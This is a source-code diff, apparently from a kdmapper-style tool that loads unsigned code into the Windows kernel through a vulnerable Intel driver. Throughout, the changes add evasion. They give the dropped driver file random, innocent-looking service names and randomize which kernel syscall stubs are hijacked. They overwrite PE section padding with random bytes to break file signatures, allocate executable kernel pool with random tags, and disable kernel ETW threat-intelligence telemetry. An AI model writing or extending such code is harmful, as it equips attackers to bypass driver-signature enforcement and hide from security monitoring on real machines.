@@ -25,9 +25,6 @@ bool intel_driver::runtimeReady = false;
 ULONG32 intel_driver::loadedDriverTimestamp = 0;
 std::wstring intel_driver::vulnerableDriverPath = L"";
 std::wstring intel_driver::loadedSymlinkName = L"";
-std::vector<uint8_t> intel_driver::cachedNtoskrnlText;
-uint64_t intel_driver::cachedNtoskrnlTextBase = 0;
-uint32_t intel_driver::cachedNtoskrnlTextSize = 0;
 bool intel_driver::g_stubPoolReady = false;
 std::vector<intel_driver::StubEntry> intel_driver::g_stubPool;
 
@@ -57,7 +54,8 @@ std::wstring intel_driver::GetDriverPath() {
 	CreateDirectoryW(subdir.c_str(), NULL);
 
 	static const wchar_t* innocuous_prefixes[] = {
-		L"audiosrv_", L"netsvc_", L"wmi_cache_", L"usbhub_", L"dxgi_", L"telemetry_", L"spool_"
+		L"audiosrv", L"netmgr", L"wmicache", L"usbhub", L"dxgi", L"telemetry", L"spoolsvc",
+		L"mssrv", L"ntsys", L"wdiag", L"pnpmon", L"evtsys"
 	};
 	const wchar_t* pfx = innocuous_prefixes[kdmUtils::CryptoRand32() % (sizeof(innocuous_prefixes) / sizeof(innocuous_prefixes[0]))];
 
@@ -99,7 +97,7 @@ bool intel_driver::PopulateStubPool() {
 	if (g_stubPoolReady)
 		return !g_stubPool.empty();
 
-	std::string candidates[] = {
+	std::vector<std::string> candidates = {
 		ENC("NtTraceControl"),
 		ENC("NtQueryDebugFilterState"),
 		ENC("NtSetDebugFilterState"),
@@ -112,9 +110,27 @@ bool intel_driver::PopulateStubPool() {
 		ENC("NtEnumerateKey"),
 		ENC("NtQueryDirectoryObject"),
 		ENC("NtPrivilegeCheck"),
+		ENC("NtEnumerateValueKey"),
+		ENC("NtQueryQuotaInformationFile"),
+		ENC("NtFlushKey"),
+		ENC("NtQueryFullAttributesFile"),
+		ENC("NtOpenKeyEx"),
+		ENC("NtQueryVolumeInformationFile"),
+		ENC("NtNotifyChangeKey"),
+		ENC("NtFlushInstructionCache"),
+		ENC("NtGetTickCount"),
+		ENC("NtQueryTimerResolution"),
+		ENC("NtDeleteValueKey"),
+		ENC("NtLockFile"),
 	};
 
-	for (size_t i = 0; i < _countof(candidates); i++) {
+	for (size_t i = candidates.size() - 1; i > 0; i--) {
+		size_t j = kdmUtils::CryptoRand32() % (i + 1);
+		std::swap(candidates[i], candidates[j]);
+	}
+
+	size_t target_count = 4 + (kdmUtils::CryptoRand32() % 4);
+	for (size_t i = 0; i < candidates.size() && g_stubPool.size() < target_count; i++) {
 		uint64_t addr = GetKernelModuleExport(ntoskrnlAddr, candidates[i]);
 		if (!addr)
 			continue;
@@ -306,18 +322,44 @@ static bool PatchDriverFile(const std::wstring& driver_path, ULONG32* out_timest
 		return nullptr;
 	};
 
-	PIMAGE_SECTION_HEADER reloc_sec = hiddenSection(".reloc");
-	if (reloc_sec && reloc_sec->SizeOfRawData > 32) {
-		DWORD off = reloc_sec->PointerToRawData + reloc_sec->SizeOfRawData - 16;
-		if (off + 16 <= fileSize)
-			kdmUtils::CryptoFill(buffer.get() + off, 16);
-	}
+	auto patchTailPaddingIfZero = [&](PIMAGE_SECTION_HEADER sec, DWORD max_bytes) {
+		if (!sec)
+			return;
+		if (sec->SizeOfRawData <= sec->Misc.VirtualSize)
+			return;
+		DWORD padding_start = sec->PointerToRawData + sec->Misc.VirtualSize;
+		DWORD padding_bytes = sec->SizeOfRawData - sec->Misc.VirtualSize;
+		DWORD patch_bytes = padding_bytes < max_bytes ? padding_bytes : max_bytes;
+		if (patch_bytes < 8)
+			return;
+		if (padding_start + patch_bytes > fileSize)
+			return;
+		for (DWORD k = 0; k < patch_bytes; k++) {
+			if (buffer[padding_start + k] != 0)
+				return;
+		}
+		kdmUtils::CryptoFill(buffer.get() + padding_start, patch_bytes);
+	};
+
+	patchTailPaddingIfZero(hiddenSection(".reloc"), 16);
 
 	PIMAGE_SECTION_HEADER rsrc_sec = hiddenSection(".rsrc");
-	if (rsrc_sec && rsrc_sec->SizeOfRawData > 64) {
-		DWORD off = rsrc_sec->PointerToRawData + rsrc_sec->SizeOfRawData - 32;
-		if (off + 32 <= fileSize)
-			kdmUtils::CryptoFill(buffer.get() + off, 32);
+	if (rsrc_sec) {
+		bool has_version = false;
+		if (rsrc_sec->PointerToRawData && rsrc_sec->SizeOfRawData >= 32 &&
+			rsrc_sec->PointerToRawData + rsrc_sec->SizeOfRawData <= fileSize) {
+			static const uint8_t vs_marker[] = { 'V', 0, 'S', 0, '_', 0, 'V', 0, 'E', 0, 'R', 0, 'S', 0, 'I', 0, 'O', 0, 'N', 0 };
+			BYTE* rsrc_data = buffer.get() + rsrc_sec->PointerToRawData;
+			DWORD rsrc_sz = rsrc_sec->SizeOfRawData;
+			for (DWORD k = 0; k + sizeof(vs_marker) <= rsrc_sz; k++) {
+				if (memcmp(rsrc_data + k, vs_marker, sizeof(vs_marker)) == 0) {
+					has_version = true;
+					break;
+				}
+			}
+		}
+		if (!has_version)
+			patchTailPaddingIfZero(rsrc_sec, 32);
 	}
 
 	auto& debugDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
@@ -684,6 +726,8 @@ NTSTATUS intel_driver::Load() {
 
 	PopulateStubPool();
 
+	intel_driver::ScopedPriorityBoost _boost;
+
 	DisableKernelEtwTi();
 
 	RestoreUsermodeEtw();
@@ -803,9 +847,6 @@ NTSTATUS intel_driver::Unload() {
 
 	g_stubPool.clear();
 	g_stubPoolReady = false;
-	cachedNtoskrnlText.clear();
-	cachedNtoskrnlTextBase = 0;
-	cachedNtoskrnlTextSize = 0;
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
 		CloseHandle(hDevice);
@@ -1231,12 +1272,23 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
+	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
+
+	static uint64_t kernel_ExAllocatePool2 = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePool2"));
+	if (kernel_ExAllocatePool2) {
+		const uint64_t POOL_FLAG_NON_PAGED          = 0x0000000000000040ull;
+		const uint64_t POOL_FLAG_NON_PAGED_EXECUTE  = 0x0000000000000080ull;
+		uint64_t flags = POOL_FLAG_NON_PAGED_EXECUTE;
+		uint64_t allocated_pool = 0;
+		if (CallKernelFunction(&allocated_pool, kernel_ExAllocatePool2, flags, size, (uint64_t)randomTag) && allocated_pool)
+			return allocated_pool;
+	}
+
 	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
 	if (!kernel_ExAllocatePool)
 		return 0;
 
 	uint64_t allocated_pool = 0;
-	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
 	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
 		return 0;
 
